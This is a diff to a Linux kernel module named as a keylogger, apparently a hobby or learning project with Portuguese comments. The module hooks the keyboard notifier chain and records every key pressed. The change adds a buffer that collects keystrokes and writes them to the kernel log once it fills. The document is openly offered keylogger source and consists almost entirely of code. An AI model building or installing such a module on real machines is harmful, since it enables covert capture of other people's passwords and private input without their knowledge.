@@ -8,6 +8,8 @@
 MODULE_LICENSE("GPL");
 
 static struct input_dev *input_dev;
+static char buffer[BUFFSIZE];
+static unsigned char buffer_index;
 
 static int keylogger_notify(struct notifier_block *self, unsigned long event, void *data) {
     struct keyboard_notifier_param *param = data;
@@ -16,7 +18,16 @@ static int keylogger_notify(struct notifier_block *self, unsigned long event, vo
         input_report_key(input_dev, param->value, 1); // Tecla pressionada
         input_sync(input_dev);
 
-        printk(KERN_INFO "%c\n", param->value);
+        buffer[buffer_index++] = param->value;
+        printk("buffer_index = %d\n", buffer_index);
+
+        if(buffer_index == BUFFSIZE-1){
+            buffer[buffer_index] = '\0';
+            printk("%s", buffer);
+            buffer_index = 0;
+            memset(buffer, 0, BUFFSIZE);
+        }
+        
     }
 
     return NOTIFY_OK;
@@ -27,6 +38,8 @@ static struct notifier_block keylogger_blk = {
 };
 
 static int start_keylogger(void){
+
+    buffer_index = 0;
 
     input_dev = input_allocate_device();
     if (!input_dev) {
